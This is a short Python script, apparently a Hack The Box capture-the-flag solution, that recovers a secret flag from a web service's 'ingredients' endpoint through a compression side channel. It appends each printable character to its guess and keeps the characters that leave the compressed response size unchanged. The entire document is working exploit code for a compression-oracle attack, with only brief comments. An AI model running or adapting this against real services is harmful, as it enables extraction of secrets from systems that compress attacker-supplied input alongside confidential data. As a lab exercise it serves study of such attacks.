import requests
from string import printable
import json

url = "http://206.189.120.31:32073/ingredients"
flag = "Secret: HTB"
headers = {"Accept": "application/json",
           "Content-Type": "application/json"}
proxies = {
  'http': 'http://127.0.0.1:8080'
}
tempFlag = "Secret: HTB"

while True:
    for i in printable:
        tempFlag += i
        myObj = {"ingredients": f"{tempFlag}"}
        r = requests.post(url, data=json.dumps(myObj), headers=headers, proxies=proxies)
        check = r.content.hex()[36:40] 
        # This is the hex of compressed size. If we add something that is not already in the file, it should increase. 
        # So we check for the right character that won't change the size.
        # If wrong, remove the last character
        if check != '3c00':
            tempFlag = tempFlag[:-1]
        print(tempFlag)
